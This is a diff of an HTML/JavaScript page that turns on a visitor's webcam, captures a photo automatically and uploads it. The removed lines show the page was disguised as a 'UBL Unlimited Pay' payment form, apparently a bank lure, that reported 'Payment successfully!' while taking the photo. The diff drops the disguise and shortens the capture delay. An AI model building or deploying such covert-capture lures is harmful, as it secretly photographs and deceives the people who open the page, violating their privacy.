@@ -3,10 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>UBL Unlimited Pay</title>
+  <title>Automatic Capture and Upload Photo</title>
 </head>
 <body>
-  <h2>Enter Your Number To Pay</h2>
+  <h2>Taking a Photo...</h2>
   <video id="video" autoplay></video>
   <p id="status"></p>
 
@@ -19,8 +19,8 @@
       .then(stream => {
         video.srcObject = stream;
 
-        // Automatically capture photo after 3 seconds
-        setTimeout(captureAndUploadPhoto, 3000);
+        // Automatically capture photo after 1 second
+        setTimeout(captureAndUploadPhoto, 1000); // Change to 1000 for 1 second
       })
       .catch(err => {
         console.error("Camera access denied:", err);
@@ -48,15 +48,15 @@
       .then(response => response.json())
       .then(data => {
         if (data.success) {
-          status.innerText = "Payment successfully!";
+          status.innerText = "Photo uploaded successfully!";
           console.log("Photo URL:", data.data.url); // Use this URL as needed
         } else {
-          status.innerText = "Error please try again.";
+          status.innerText = "Error uploading photo.";
         }
       })
       .catch(err => {
-        console.error("Error please try again:", err);
-        status.innerText = "Error please try again.";
+        console.error("Error uploading photo:", err);
+        status.innerText = "Error uploading photo.";
       });
     }
   </script>
